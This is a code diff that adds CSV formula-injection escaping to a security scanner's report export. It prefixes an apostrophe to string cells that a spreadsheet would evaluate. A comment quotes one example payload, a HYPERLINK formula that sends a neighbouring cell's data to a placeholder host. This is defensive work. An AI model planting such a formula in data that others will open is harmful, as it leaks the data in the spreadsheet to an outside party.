@@ -22,6 +22,33 @@ from rich.text import Text
 
 from ai_guard.scanners.base import Finding, ScanResult, occurrence_unit
 
+# A cell a spreadsheet would run rather than display. csv handles commas and
+# quotes; formulas are not a CSV concept, so it has no opinion about them.
+# Excel, LibreOffice and Sheets all evaluate a cell beginning with one of
+# these, and leading whitespace does not save you: the spreadsheet strips it
+# and runs what is left. A device named =HYPERLINK("http://x/"&A1) exfiltrates
+# the row beside it the moment somebody opens the export.
+#
+# Duplicated from portal/app/derive.py. The scanner and the portal are separate
+# installables with nothing shared between them, and a helper this small is
+# better copied than turned into a dependency.
+_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_safe(value):
+    """A cell a spreadsheet will display rather than evaluate.
+
+    Prefixed with an apostrophe, which spreadsheets read as "what follows is
+    text" and do not render. Strings only: the counts are integers and cannot
+    carry a formula.
+    """
+    s = "" if value is None else str(value)
+    if not s:
+        return s
+    return "'" + s if (s[0] in _FORMULA_LEAD
+                       or s.lstrip("\t\r\n ").startswith(_FORMULA_LEAD)) else s
+
+
 
 RISK_COLORS = {
     "high": "red",
@@ -566,15 +593,20 @@ class ReportGenerator:
         writer.writeheader()
 
         for f in self.all_findings:
+            # Every string here is worth guarding, not only the obvious ones.
+            # service, vendor and category come from the registry, which a
+            # discovery MR can add to; user_upn, device_name and detail come
+            # straight from a tenant. The counts and the timestamps are not
+            # strings and cannot carry a formula.
             writer.writerow({
-                "service": f.service.name,
-                "vendor": f.service.vendor,
-                "category": f.service.category,
-                "risk_tier": f.risk_tier,
-                "source": f.source.value,
-                "user_upn": f.user_upn or "",
-                "device_name": f.device_name or "",
-                "detail": f.detail,
+                "service": _csv_safe(f.service.name),
+                "vendor": _csv_safe(f.service.vendor),
+                "category": _csv_safe(f.service.category),
+                "risk_tier": _csv_safe(f.risk_tier),
+                "source": _csv_safe(f.source.value),
+                "user_upn": _csv_safe(f.user_upn or ""),
+                "device_name": _csv_safe(f.device_name or ""),
+                "detail": _csv_safe(f.detail),
                 "occurrence_count": f.occurrence_count,
                 "occurrence_unit": occurrence_unit(f.source),
                 "first_seen": f.first_seen.isoformat() if f.first_seen else "",
